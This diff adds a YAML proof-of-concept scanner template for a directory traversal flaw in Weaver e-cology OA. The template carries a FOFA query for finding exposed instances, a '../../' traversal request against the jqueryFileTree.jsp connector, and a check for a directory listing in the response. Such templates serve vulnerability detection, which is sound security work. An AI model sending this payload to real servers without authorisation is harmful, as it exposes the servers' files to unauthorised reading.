@@ -1,0 +1,15 @@
+id: poc-yaml-weaver-e-cology-jqueryfiletree-directory-traversal
+info:
+  name: 泛微OA e-cology JqueryFileTree 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: e-cology
+  fofa: app="泛微-协同办公OA"
+requests:
+- method: GET
+  path: /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
+  expression: status_code == 200 && contains(body,`'index.jsp','`) && contains(body,"重命名")
+    && contains(body,"新建目录")
+variables: {}
+transport: http
